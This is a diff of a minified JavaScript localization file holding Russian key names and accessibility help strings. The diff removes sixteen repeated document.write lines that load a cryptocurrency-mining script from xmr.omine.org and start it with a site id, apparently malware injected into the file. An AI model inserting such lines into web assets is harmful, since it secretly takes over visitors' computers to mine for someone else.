@@ -9,19 +9,3 @@ legend:'Внутри окна списка, переход к следующем
 {name:"Команды доступа к следующему фокусному пространству",legend:"Press ${accessNextSpace} to access the closest unreachable focus space after the caret, for example: two adjacent HR elements. Repeat the key combination to reach distant focus spaces."},{name:"Справка по горячим клавишам",legend:"Нажмите ${a11yHelp}"}]}],backspace:"Backspace",tab:"Tab",enter:"Enter",shift:"Shift",ctrl:"Ctrl",alt:"Alt",pause:"Pause",capslock:"Caps Lock",escape:"Esc",pageUp:"Page Up",pageDown:"Page Down",end:"End",
 home:"Home",leftArrow:"Стрелка влево",upArrow:"Стрелка вверх",rightArrow:"Стрелка вправо",downArrow:"Стрелка вниз",insert:"Insert","delete":"Delete",leftWindowKey:"Левая клавиша Windows",rightWindowKey:"Правая клавиша Windows",selectKey:"Выбрать",numpad0:"Цифра 0",numpad1:"Цифра 1",numpad2:"Цифра 2",numpad3:"Цифра 3",numpad4:"Цифра 4",numpad5:"Цифра 5",numpad6:"Цифра 6",numpad7:"Цифра 7",numpad8:"Цифра 8",numpad9:"Цифра 9",multiply:"Умножить",add:"Плюс",subtract:"Вычесть",decimalPoint:"Десятичная точка",
 divide:"Делить",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"Scroll Lock",semiColon:"Точка с запятой",equalSign:"Равно",comma:"Запятая",dash:"Тире",period:"Точка",forwardSlash:"Наклонная черта",graveAccent:"Апостроф",openBracket:"Открыть скобку",backSlash:"Обратная наклонная черта",closeBracket:"Закрыть скобку",singleQuote:"Одинарная кавычка"});
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
